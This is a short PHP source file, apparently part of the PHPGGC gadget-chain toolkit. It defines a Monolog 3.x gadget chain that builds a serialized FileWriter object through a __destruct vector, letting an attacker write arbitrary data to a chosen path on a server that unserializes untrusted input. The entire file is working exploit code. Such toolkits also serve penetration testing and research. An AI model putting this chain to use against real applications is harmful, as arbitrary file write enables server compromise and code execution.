<?php

namespace GadgetChain\Monolog;

class FW2 extends \PHPGGC\GadgetChain\FileWrite
{
    public static $version = '3.0.0 <= 3.1.0+';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';


    public function generate(array $parameters)
    {
        $path = $parameters['remote_path'];
        $data = $parameters['data'];
        
        return new \JakubOnderka\PhpParallelLint\FileWriter($data, $path);
    }
}